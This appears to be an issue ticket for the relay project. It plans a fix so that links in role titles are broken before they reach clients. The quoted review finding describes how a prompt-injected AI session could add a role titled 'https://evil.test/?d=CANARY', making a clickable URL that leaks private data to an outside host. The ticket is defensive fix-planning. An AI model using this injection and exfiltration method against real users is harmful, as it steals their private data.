# Break the links in a role's title an outsider may have shaped

## Context

Found by Codex in the fourth review round on relay#95 and sent by the
relay#95 session on 2026-11-15. The dashboard's half is fixed in
relay#95: relay-tui now breaks every link in a role's title, in a ready
item's `from` line and in relay's refusal text. What is left is relay's
half.

The reviewer's text:

> G1/G2 — contaminated roster titles reach the terminal as unbroken
> URLs. In render/hub.go:122, `roleName` calls `paneLine(r.Title,
> false)`, disabling defanging. wire/hub.go:65 discards the roster's
> labels. The new gate at links.go:195 leaves this text untouched
> because it contains no OSC 8 sequence. Trigger: a contaminated private
> role legitimately granted `:may-add` calls `role_add` with
> {"id":"helper","title":"https://evil.test/?d=CANARY","instructions":"Help."}.
> Relay accepts it and sends the title with ["contaminated","private"].
> At width 60, the dashboard displays the complete address with an empty
> live set. I reproduced both the accepted relay command and the
> resulting terminal screen through the real UI and terminal emulator.
> Normal URL detection can make it clickable, for example WezTerm's
> default rules. Scope: ordinary prompt injection into a role with
> legitimate registry permissions can place private data in the URL;
> clicking sends it out. No targeted attacker, local shell, precise
> timing, or second failure is required. This is a pre-existing roster
> path left uncovered by the claimed guarantee.

What relay does with a title, checked against the code by the relay#93
session on 2026-11-15:

- `relay.core` keeps `title` as written when a role is added or
  updated.
- `relay.roster/wire-role` sends the title as it is, beside the role's
  labels, in `_relay/roles` and `_relay/roles/changed`.
- `relay.hub/list-sessions` answers `session/list` with the same title
  as each conversation's `title`, with no labels beside it. The reviewer
  did not name this path. A plain ACP client, such as the phone's
  (relay#84), shows it as the conversation's name.
- `relay roles` on the command line is covered already.
  `relay.render/roles` passes each line through `text/for-operator`
  with the labels of the role's id and title.
- Not checked: whether a role's title reaches mail or a push.

The relay#95 session also asked about the "Drew on" line, which relay
sends as a ready item's `from` and a message's `drewOn`.
`relay.provenance/phrase` breaks the links in the two names an outsider
chooses, a web page's and a mail's sender. The name of a GitHub
repository, a calendar feed, a files mount or a tool goes in as written.
As far as I read it those come from relay.edn; I did not trace each one.

## Acceptance criteria

- [ ] A title whose labels are contaminated reaches no client with a
  link that can be followed: not in `_relay/roles`, not in
  `_relay/roles/changed`, and not in a `session/list` answer.
- [ ] Every other place relay shows a role's title is listed here, and
  each breaks its links or is shown not to need to.
- [ ] The names in a "Drew on" line that are not broken are shown to
  come only from Kira's settings, or they are broken too.
- [ ] A test adds a role as the reviewer did, from a contaminated
  session with an address as the title, and finds no whole address in
  any of those answers. It fails on today's code.
- [ ] A pentest case does the same through a plain ACP client.
- [ ] docs/client-protocol.md says a role's title is ready to show, as a
  card's text is.
- [ ] `bb verify` passes, and an adversarial Codex review finds nothing
  in scope.

## Plan

Related: relay#95 and relay#118. relay#104 is the same gap for
conversation text, and relay#84 is the phone trial both should land
before.

## Log
